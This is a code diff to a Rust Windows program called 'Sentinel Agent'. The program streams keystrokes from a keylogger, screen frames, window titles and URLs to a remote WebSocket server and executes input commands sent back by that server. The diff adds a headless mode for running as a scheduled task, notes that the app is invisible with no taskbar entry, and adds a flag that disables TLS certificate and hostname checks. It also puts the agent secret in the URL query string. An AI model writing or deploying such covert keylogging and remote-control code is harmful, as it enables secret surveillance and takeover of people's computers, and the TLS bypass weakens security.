@@ -1,4 +1,4 @@
-//! # Windows Monitoring Agent
+//! # Sentinel Agent (Windows)
 //!
 //! Connects to a remote WebSocket server and streams real-time telemetry.
 //!
@@ -63,9 +63,10 @@ use keylogger::InputEvent;
 use tokio::sync::mpsc;
 use tokio::time::{interval, MissedTickBehavior};
 use tokio_tungstenite::{
-    connect_async,
+    connect_async, connect_async_tls_with_config,
+    tungstenite::client::IntoClientRequest,
     tungstenite::{protocol::frame::coding::CloseCode, protocol::CloseFrame, Message},
-    MaybeTlsStream, WebSocketStream,
+    Connector, MaybeTlsStream, WebSocketStream,
 };
 use tracing::{error, info, warn};
 use tracing_subscriber::{fmt, EnvFilter};
@@ -99,16 +100,103 @@ const WINDOW_POLL_INTERVAL_MS: u64 = 200;
 
 fn main() {
     // ── Logging ───────────────────────────────────────────────────────────
-    fmt()
-        .with_env_filter(
-            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
-        )
-        .with_target(false)
-        .with_thread_ids(false)
-        .compact()
-        .init();
+    //
+    // In Windows release builds we run with `windows_subsystem = "windows"`,
+    // so there is often no console attached. Write logs to a file under
+    // %LOCALAPPDATA%\sentinel\agent.log by default so failures are visible.
+    //
+    // Override path by setting `AGENT_LOG_FILE` to an absolute path.
+    let env_filter = EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info"));
 
-    info!("Windows monitoring agent v{}", env!("CARGO_PKG_VERSION"));
+    let mut log_file_path = std::env::var("AGENT_LOG_FILE")
+        .ok()
+        .map(std::path::PathBuf::from);
+    if log_file_path.is_none() {
+        let mut p = config::config_path();
+        p.pop(); // .../sentinel
+        p.push("agent.log");
+        log_file_path = Some(p);
+    }
+
+    let _log_guard = if let Some(path) = log_file_path {
+        if let Some(parent) = path.parent() {
+            let _ = std::fs::create_dir_all(parent);
+        }
+        match std::fs::OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(&path)
+        {
+            Ok(file) => {
+                let (writer, guard) = tracing_appender::non_blocking(file);
+                fmt()
+                    .with_env_filter(env_filter)
+                    .with_target(false)
+                    .with_thread_ids(false)
+                    .compact()
+                    .with_writer(writer)
+                    .init();
+                Some(guard)
+            }
+            Err(_) => {
+                // Last resort (debug builds / console runs)
+                fmt()
+                    .with_env_filter(env_filter)
+                    .with_target(false)
+                    .with_thread_ids(false)
+                    .compact()
+                    .init();
+                None
+            }
+        }
+    } else {
+        fmt()
+            .with_env_filter(env_filter)
+            .with_target(false)
+            .with_thread_ids(false)
+            .compact()
+            .init();
+        None
+    };
+
+    info!("Sentinel agent v{}", env!("CARGO_PKG_VERSION"));
+
+    // Allow forcing the settings UI to show on startup. This is helpful on
+    // Windows where the app has no taskbar entry and is otherwise "invisible"
+    // until the global hotkey is pressed.
+    let show_ui_on_startup = std::env::args().any(|a| a == "--show-ui")
+        || std::env::var("AGENT_SHOW_UI")
+            .map(|v| {
+                matches!(
+                    v.trim(),
+                    "1" | "true" | "TRUE" | "yes" | "YES" | "on" | "ON"
+                )
+            })
+            .unwrap_or(false);
+
+    // Allow disabling the UI entirely (headless mode). Useful when running the
+    // agent as a scheduled task / service where a window surface cannot be created.
+    let no_ui = std::env::args().any(|a| a == "--no-ui")
+        || std::env::var("AGENT_NO_UI")
+            .map(|v| {
+                matches!(
+                    v.trim(),
+                    "1" | "true" | "TRUE" | "yes" | "YES" | "on" | "ON"
+                )
+            })
+            .unwrap_or(false);
+
+    // Allow connecting to WSS endpoints with invalid/untrusted certificates.
+    // This is NOT safe for production, but can help when TLS is misconfigured.
+    let insecure_tls = std::env::args().any(|a| a == "--insecure-tls")
+        || std::env::var("AGENT_INSECURE_TLS")
+            .map(|v| {
+                matches!(
+                    v.trim(),
+                    "1" | "true" | "TRUE" | "yes" | "YES" | "on" | "ON"
+                )
+            })
+            .unwrap_or(false);
 
     // ── Load persisted configuration ──────────────────────────────────────
     let initial_config = config::load_config();
@@ -154,7 +242,15 @@ fn main() {
                 }
 
                 let (frame_tx, frame_rx) = mpsc::channel::<Vec<u8>>(FRAME_CHANNEL_CAP);
-                run_agent_loop(config_rx, frame_tx, frame_rx, key_rx, status_bg).await;
+                run_agent_loop(
+                    config_rx,
+                    frame_tx,
+                    frame_rx,
+                    key_rx,
+                    status_bg,
+                    insecure_tls,
+                )
+                .await;
             });
         })
         .expect("Failed to spawn agent thread");
@@ -163,11 +259,20 @@ fn main() {
     match ready_rx.recv() {
         Ok(Ok(())) => {}
         Ok(Err(e)) => warn!("Keylogger failed to start: {e:#}"),
-        Err(_)     => warn!("Agent thread exited before keylogger was ready"),
+        Err(_) => warn!("Agent thread exited before keylogger was ready"),
     }
 
-    // ── egui settings window (main thread; eframe owns the event loop) ───
-    let _ = ui::AgentApp::new(initial_config, config_tx, agent_status).run();
+    if no_ui {
+        info!("UI disabled (--no-ui / AGENT_NO_UI). Running headless.");
+        loop {
+            std::thread::sleep(Duration::from_secs(60));
+        }
+    } else {
+        // ── egui settings window (main thread; eframe owns the event loop) ───
+        let _ = ui::AgentApp::new(initial_config, config_tx, agent_status)
+            .with_show_on_startup(show_ui_on_startup)
+            .run();
+    }
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -176,10 +281,11 @@ fn main() {
 
 async fn run_agent_loop(
     mut config_rx: tokio::sync::watch::Receiver<Option<Config>>,
-    frame_tx:      mpsc::Sender<Vec<u8>>,
-    mut frame_rx:  mpsc::Receiver<Vec<u8>>,
-    mut key_rx:    mpsc::UnboundedReceiver<InputEvent>,
-    status:        Arc<Mutex<AgentStatus>>,
+    frame_tx: mpsc::Sender<Vec<u8>>,
+    mut frame_rx: mpsc::Receiver<Vec<u8>>,
+    mut key_rx: mpsc::UnboundedReceiver<InputEvent>,
+    status: Arc<Mutex<AgentStatus>>,
+    insecure_tls: bool,
 ) {
     // The capture stop-flag survives reconnects.
     let mut capture_stop: Option<Arc<AtomicBool>> = None;
@@ -211,13 +317,10 @@ async fn run_agent_loop(
                 info!("Connecting to {ws_url} …");
                 info!("Target FPS (streaming): {TARGET_FPS}");
 
-                match connect_async(&ws_url).await {
+                match connect_ws(&ws_url, insecure_tls).await {
                     Ok((ws_stream, response)) => {
                         set_status(&status, AgentStatus::Connected);
-                        info!(
-                            "WebSocket connected (HTTP {}).",
-                            response.status().as_u16()
-                        );
+                        info!("WebSocket connected (HTTP {}).", response.status().as_u16());
                         match run_session(
                             ws_stream,
                             &frame_tx,
@@ -227,8 +330,8 @@ async fn run_agent_loop(
                         )
                         .await
                         {
-                            Ok(())  => info!("Session closed gracefully."),
-                            Err(e)  => error!("Session error: {e:#}"),
+                            Ok(()) => info!("Session closed gracefully."),
+                            Err(e) => error!("Session error: {e:#}"),
                         }
 
                         // Stop the capture thread on every session end so it
@@ -243,7 +346,7 @@ async fn run_agent_loop(
                     }
                     Err(e) => {
                         set_status(&status, AgentStatus::Error(e.to_string()));
-                        error!("Connection failed: {e}");
+                        error!("Connection failed: {e:#}");
                     }
                 }
 
@@ -260,15 +363,50 @@ async fn run_agent_loop(
     }
 }
 
+async fn connect_ws(
+    ws_url: &str,
+    insecure_tls: bool,
+) -> Result<(
+    WebSocketStream<MaybeTlsStream<tokio::net::TcpStream>>,
+    tokio_tungstenite::tungstenite::handshake::client::Response,
+)> {
+    if insecure_tls && ws_url.trim_start().starts_with("wss://") {
+        warn!("TLS verification is DISABLED for this connection (--insecure-tls / AGENT_INSECURE_TLS).");
+        // native-tls: accept invalid certs/hostnames (dangerous; debugging only).
+        let mut builder = native_tls::TlsConnector::builder();
+        builder.danger_accept_invalid_certs(true);
+        builder.danger_accept_invalid_hostnames(true);
+        let tls = builder
+            .build()
+            .context("Failed to build native-tls connector")?;
+
+        let req = ws_url
+            .into_client_request()
+            .context("Invalid WebSocket URL")?;
+        return Ok(connect_async_tls_with_config(
+            req,
+            None,
+            false,
+            Some(Connector::NativeTls(tls)),
+        )
+        .await
+        .context("WebSocket connect failed")?);
+    }
+
+    Ok(connect_async(ws_url)
+        .await
+        .context("WebSocket connect failed")?)
+}
+
 // ─────────────────────────────────────────────────────────────────────────────
 // Session driver  (unchanged from original)
 // ─────────────────────────────────────────────────────────────────────────────
 
 async fn run_session(
-    ws_stream:    WebSocketStream<MaybeTlsStream<tokio::net::TcpStream>>,
-    frame_tx:     &mpsc::Sender<Vec<u8>>,
-    frame_rx:     &mut mpsc::Receiver<Vec<u8>>,
-    key_rx:       &mut mpsc::UnboundedReceiver<InputEvent>,
+    ws_stream: WebSocketStream<MaybeTlsStream<tokio::net::TcpStream>>,
+    frame_tx: &mpsc::Sender<Vec<u8>>,
+    frame_rx: &mut mpsc::Receiver<Vec<u8>>,
+    key_rx: &mut mpsc::UnboundedReceiver<InputEvent>,
     capture_stop: &mut Option<Arc<AtomicBool>>,
 ) -> Result<()> {
     let (mut ws_tx, mut ws_rx) = ws_stream.split();
@@ -285,7 +423,7 @@ async fn run_session(
         }
         let _ = ws_tx
             .send(Message::Close(Some(CloseFrame {
-                code:   CloseCode::Normal,
+                code: CloseCode::Normal,
                 reason: "agent shutting down".into(),
             })))
             .await;
@@ -293,15 +431,14 @@ async fn run_session(
     });
 
     // ── Input controller ──────────────────────────────────────────────────
-    let mut controller =
-        InputController::new().context("Failed to create input controller")?;
+    let mut controller = InputController::new().context("Failed to create input controller")?;
 
     // ── Window focus tracker ──────────────────────────────────────────────
     let mut win_tracker = WindowTracker::new();
 
     // ── Timers ────────────────────────────────────────────────────────────
-    let mut frame_ticker  = interval(Duration::from_millis(FRAME_INTERVAL_MS));
-    let mut url_ticker    = interval(Duration::from_secs(2));
+    let mut frame_ticker = interval(Duration::from_millis(FRAME_INTERVAL_MS));
+    let mut url_ticker = interval(Duration::from_secs(2));
     let mut window_ticker = interval(Duration::from_millis(WINDOW_POLL_INTERVAL_MS));
 
     frame_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
@@ -447,13 +584,13 @@ async fn run_session(
 // ─────────────────────────────────────────────────────────────────────────────
 
 fn handle_server_command(
-    text:         &str,
-    frame_tx:     &mpsc::Sender<Vec<u8>>,
+    text: &str,
+    frame_tx: &mpsc::Sender<Vec<u8>>,
     capture_stop: &mut Option<Arc<AtomicBool>>,
-    controller:   &mut InputController,
+    controller: &mut InputController,
 ) {
     let val: serde_json::Value = match serde_json::from_str(text) {
-        Ok(v)  => v,
+        Ok(v) => v,
         Err(_) => return,
     };
 
@@ -488,16 +625,30 @@ fn handle_server_command(
 // Helpers
 // ─────────────────────────────────────────────────────────────────────────────
 
-/// Build the full WebSocket URL, appending `?name=<agent_name>`.
+/// Build the full WebSocket URL, appending `?name=<agent_name>` and (optionally)
+/// `&secret=<agent_password>` for server-side agent authentication.
 fn build_ws_url(cfg: &Config) -> String {
     let base = cfg.server_url.trim_end_matches('/');
-    if cfg.agent_name.is_empty() {
-        base.to_string()
-    } else if base.contains('?') {
-        format!("{}&name={}", base, cfg.agent_name)
-    } else {
-        format!("{}?name={}", base, cfg.agent_name)
+    let mut url = base.to_string();
+
+    // Note: we intentionally do minimal encoding here because the UI expects a
+    // copy/paste-friendly value. Use URL-safe secrets (base64/hex) in prod.
+    let mut first_param = !url.contains('?');
+
+    if !cfg.agent_name.is_empty() {
+        url.push(if first_param { '?' } else { '&' });
+        first_param = false;
+        url.push_str("name=");
+        url.push_str(cfg.agent_name.trim());
     }
+
+    if !cfg.agent_password.is_empty() {
+        url.push(if first_param { '?' } else { '&' });
+        url.push_str("secret=");
+        url.push_str(cfg.agent_password.trim());
+    }
+
+    url
 }
 
 /// Write to the shared status mutex, ignoring lock-poison errors.
